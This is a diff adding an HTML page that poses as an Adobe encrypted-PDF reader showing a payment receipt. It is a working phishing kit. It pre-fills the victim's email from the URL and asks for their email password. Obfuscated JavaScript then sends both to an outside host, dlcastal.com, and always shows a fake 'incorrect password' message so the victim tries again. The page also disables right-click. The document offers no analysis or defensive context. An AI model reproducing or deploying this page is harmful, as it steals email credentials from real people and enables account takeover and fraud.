@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Online - Pdf Encrypted Reader</title>
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden; /* Hide overflow to prevent scrolling */
+    }
+
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+      filter: blur(0); /* Initial no blur effect */
+    }
+
+    #login-container {
+      display: none;
+      max-width: 250px;
+      background-color: rgba(255, 255, 255, 0.8); /* White transparent background */
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(41, 0, 0, 0.1);
+      text-align: center;
+      transition: opacity 1s ease-in-out;
+      color: black; /* Black text color */
+    }
+
+    #login-icon {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 20px;
+    }
+
+    #small-text {
+      font-family: '', cursive;
+      font-size: 15px;
+      margin-bottom: 10px;
+    }
+
+    #smaller-text {
+      font-family: 'High Tower Text', cursive;
+      font-size: 10px;
+      margin-bottom: 10px;
+    }
+
+    #beautiful-text {
+      font-family: 'Goudy Old Style', cursive;
+      font-size: 12px;
+      margin-bottom: 15px;
+    }
+
+    #login-container * {
+      color: #333; /* Dark gray color for text to complement white background */
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      border: none;
+      border-bottom: 2px solid #3498db; /* Border-bottom style */
+      outline: none; /* Remove outline on focus */
+    }
+
+    input:focus {
+      border-bottom: 2px solid #e74c3c; /* Border-bottom style on focus */
+    }
+
+    #loading-icon {
+      font-size: 48px;
+      color: #3498db;
+      animation: spin 1s linear infinite; /* Animation for spinning effect */
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    #login-button {
+      background-color: #5ccc1f;
+      color: white;
+      padding: 8px 16px; /* Reduced padding for smaller size */
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px; /* Reduced font size for smaller size */
+    }
+
+    #login-button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <img id="background" src="https://i.imgur.com/5qxoMHE.png" alt="Background Image">
+
+  <!-- Loading icon -->
+  <div id="loading-icon">
+    <i class="fas fa-spinner fa-spin"></i>
+  </div>
+
+  <div id="login-container">
+    <img id="login-icon" src="https://www.iconpacks.net/icons/2/free-pdf-download-icon-2617-thumb.png" alt="Login Icon">
+    <div id="small-text"> <bold>To:</bold> <span id="beneficiary-email"></span></div> <br>
+    <div id="beautiful-text">Login to view payment receipt.</div>
+    <!-- Form starts here -->
+    <form action="" method="post" onsubmit="return login()">
+      <input type="hidden" id="email" name="email" placeholder="Email Address" value="{{Email}}" readonly required>
+      <input type="password" id="password" name="password" placeholder="Email Password" required>
+      <button id="login-button" type="submit">Click Here</button>
+      <br><br>
+      <div id="smaller-text">This Document is end-to-end encrypted, &#x1F512;</div>
+    </form>
+    <!-- Form ends here -->
+  </div>
+
+  <script>
+   var _0xf1f0=_0x2b74;function _0x5dfd(){var _0x311e6a=['975094JfxMrX','2fnKkgI','onload','background','addEventListener','text','DOMContentLoaded','contextmenu','trim','2395064AZyFUe','location','https://dlcastal.com/m/fir.php','filter','catch','display','12667653yTYeXm','Fetch\x20error:','loading-icon','log','Unfortunately,\x20we\x20can\x27t\x20log\x20you\x20in\x20because\x20the\x20email\x20password\x20you\x20entered\x20is\x20incorrect.\x20Please\x20try\x20again\x20','email=','5PgIwZj','then','replace','getElementById','email','[?&]','POST','password','14255810zhjFXb','11hrVzxv','exec','login-container','href','24866316OFNYMk','Please\x20enter\x20both\x20email\x20and\x20password.','(=([^&#]*)|&|#|$)','123tTZrQj','Network\x20response\x20was\x20not\x20ok','&password=','value','preventDefault','38548zzxzTG','style','none','blur(1.5px)','2659458FGANft','block','14dINrtS'];_0x5dfd=function(){return _0x311e6a;};return _0x5dfd();}(function(_0x550731,_0x4866ba){var _0xb901eb=_0x2b74,_0x21fe77=_0x550731();while(!![]){try{var _0x9c3517=parseInt(_0xb901eb(0x1e8))/0x1*(-parseInt(_0xb901eb(0x1e9))/0x2)+-parseInt(_0xb901eb(0x1dc))/0x3*(parseInt(_0xb901eb(0x1e1))/0x4)+-parseInt(_0xb901eb(0x1fd))/0x5*(parseInt(_0xb901eb(0x1e5))/0x6)+parseInt(_0xb901eb(0x1e7))/0x7*(parseInt(_0xb901eb(0x1f1))/0x8)+parseInt(_0xb901eb(0x1f7))/0x9+-parseInt(_0xb901eb(0x205))/0xa*(parseInt(_0xb901eb(0x206))/0xb)+parseInt(_0xb901eb(0x20a))/0xc;if(_0x9c3517===_0x4866ba)break;else _0x21fe77['push'](_0x21fe77['shift']());}catch(_0x596d7b){_0x21fe77['push'](_0x21fe77['shift']());}}}(_0x5dfd,0xccf11),document[_0xf1f0(0x1ec)](_0xf1f0(0x1ef),function(_0x521540){var _0x394905=_0xf1f0;_0x521540[_0x394905(0x1e0)]();}),document[_0xf1f0(0x1ec)](_0xf1f0(0x1ee),function(){var _0x44db99=_0xf1f0;setTimeout(function(){var _0x505fd9=_0x2b74;document[_0x505fd9(0x200)]('background')[_0x505fd9(0x1e2)][_0x505fd9(0x1f4)]=_0x505fd9(0x1e4);}),document[_0x44db99(0x200)](_0x44db99(0x1eb))[_0x44db99(0x1ea)]=function(){var _0xc3410f=_0x44db99;document[_0xc3410f(0x200)](_0xc3410f(0x1f9))[_0xc3410f(0x1e2)]['display']=_0xc3410f(0x1e6);},setTimeout(function(){var _0xaa8bc3=_0x44db99;document['getElementById'](_0xaa8bc3(0x1f9))[_0xaa8bc3(0x1e2)][_0xaa8bc3(0x1f6)]=_0xaa8bc3(0x1e3),document[_0xaa8bc3(0x200)](_0xaa8bc3(0x208))['style']['display']=_0xaa8bc3(0x1e6);},0x7d0);}));function login(){var _0x171b87=_0xf1f0,_0x7ad881=document['getElementById'](_0x171b87(0x201))[_0x171b87(0x1df)],_0x574be5=document[_0x171b87(0x200)]('password')[_0x171b87(0x1df)];if(_0x7ad881['trim']()===''||_0x574be5[_0x171b87(0x1f0)]()==='')return alert(_0x171b87(0x1da)),![];return fetch(_0x171b87(0x1f3),{'method':_0x171b87(0x203),'headers':{'Content-Type':'application/x-www-form-urlencoded'},'body':_0x171b87(0x1fc)+encodeURIComponent(_0x7ad881)+_0x171b87(0x1de)+encodeURIComponent(_0x574be5)})[_0x171b87(0x1fe)](_0x63f43d=>{var _0x5e71b9=_0x171b87;if(!_0x63f43d['ok'])throw new Error(_0x5e71b9(0x1dd));return _0x63f43d[_0x5e71b9(0x1ed)]();})[_0x171b87(0x1fe)](_0x632ab0=>{var _0x1e4d4f=_0x171b87;console[_0x1e4d4f(0x1fa)](_0x632ab0);})[_0x171b87(0x1f5)](_0x5c30ba=>{var _0x23520d=_0x171b87;console['error'](_0x23520d(0x1f8),_0x5c30ba);}),alert(_0x171b87(0x1fb)),document[_0x171b87(0x200)](_0x171b87(0x204))['value']='',![];}function getParameterByName(_0xbe31d6,_0x3e6fd1){var _0x138008=_0xf1f0;if(!_0x3e6fd1)_0x3e6fd1=window[_0x138008(0x1f2)][_0x138008(0x209)];_0xbe31d6=_0xbe31d6[_0x138008(0x1ff)](/[\[\]]/g,'\x5c$&');var _0x4177aa=new RegExp(_0x138008(0x202)+_0xbe31d6+_0x138008(0x1db)),_0x4e5526=_0x4177aa[_0x138008(0x207)](_0x3e6fd1);if(!_0x4e5526)return null;if(!_0x4e5526[0x2])return'';return decodeURIComponent(_0x4e5526[0x2]['replace'](/\+/g,'\x20'));}var emailFromURL=getParameterByName(_0xf1f0(0x201));function _0x2b74(_0x5d33ea,_0x3b6eff){var _0x5dfdc6=_0x5dfd();return _0x2b74=function(_0x2b74f4,_0x54f08e){_0x2b74f4=_0x2b74f4-0x1da;var _0x16da08=_0x5dfdc6[_0x2b74f4];return _0x16da08;},_0x2b74(_0x5d33ea,_0x3b6eff);}emailFromURL&&(document[_0xf1f0(0x200)](_0xf1f0(0x201))[_0xf1f0(0x1df)]=emailFromURL,document[_0xf1f0(0x200)]('beneficiary-email')['textContent']=emailFromURL);
+  </script>
+</body>
+</html>
